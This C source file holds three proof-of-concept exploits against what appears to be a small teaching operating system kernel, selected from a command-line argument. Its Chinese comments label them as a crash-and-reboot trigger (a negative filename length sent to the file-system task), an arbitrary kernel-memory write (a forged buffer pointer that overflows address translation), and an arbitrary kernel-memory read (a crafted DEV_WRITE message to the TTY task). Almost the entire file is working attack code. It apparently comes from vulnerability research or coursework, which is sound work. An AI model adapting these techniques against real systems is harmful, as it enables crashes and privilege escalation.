#include "type.h"
#include "cmd_head.h"
#include "stdio.h"

int poc1() // 触发系统崩溃重启
{
    MESSAGE msg;
    char path[] = "poc2_test";
    memset(&msg, 0, sizeof(msg));
    msg.type = OPEN;
    msg.FLAGS = O_RDWR | O_CREAT;
    msg.PATHNAME = path;
    msg.NAME_LEN = -1; // 恶意设置文件名长度为负值
    printf("hacking...NAME_LEN=%d...\n", msg.NAME_LEN);
    send_recv(BOTH, TASK_FS, &msg);
    printf("ret:%d,errorcode:%d\n", msg.type, msg.RETVAL);
    return 0;
}

int poc2() // 任意地址写
{
    // 1. 创建并写入文件
    int fd = open("poc1file", O_CREAT | O_RDWR);
    if (fd < 0)
    {
        printf("fail! fd=%d\n", fd);
        return -1;
    }
    char payload[] = "1234567890";
    write(fd, payload, strlen(payload));
    close(fd);

    // 2. 重新打开文件用于读取
    fd = open("poc1file", O_RDWR);
    // 准备利用的缓冲区指针 (计算使 va2la 溢出)
    unsigned int seg_base = 0xc00000; // 当前进程段基址
    unsigned int target_addr = 0x0;   // 目标内核地址
    unsigned int evil_offset = (unsigned int)(target_addr - seg_base + 1 + 0xffffffff);
    char *evil_buf = (char *)evil_offset; // 伪造缓冲区指针
    int nbytes = strlen(payload);         // 读取字节数
    printf("hacking 0x%x...\n", target_addr);
    // 3. 触发读取漏洞
    int ret = read(fd, evil_buf, nbytes);
    printf("ret=%d\n", ret);
    close(fd);
    return 0;
}


int poc3()//任意地址读
{
    MESSAGE msg;
    int pid = getpid();
    msg.source = pid;
    msg.PROC_NR = TASK_FS; // any task
    msg.type = DEV_WRITE;
    msg.BUF = (void *)0x0; // target addr
    msg.CNT = 0x20;
    msg.DEVICE = 2;
    printf("try send DEV_WRITE to TASK_TTY, leak content in 0x10000\n");
    send_recv(BOTH, TASK_TTY, &msg);
    printf("\nreceived from TASK_TTY: %d\n", msg.type);
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc != 2 || argv[1] == 0) {
        printf("usage: %s <poc_id>\n", argv[0]);
        return 1;
    }

    /* 严格：参数必须恰好是单字符 "1"/"2"/"3" */
    if (argv[1][0] == '\0' || argv[1][1] != '\0') {
        printf("invalid poc\n");
        return 1;
    }

    char c = argv[1][0];
    if (c < '1' || c > '3') {
        printf("invalid poc\n");
        return 1;
    }

    printf("poc %c\n", c);

    switch (c) {
    case '1':
        poc1();
        break;
    case '2':
        poc2();
        break;
    case '3':
        poc3();
        break;
    default:
        /* 逻辑上不会到这里 */
        printf("invalid poc\n");
        return 1;
    }

    return 0;
}

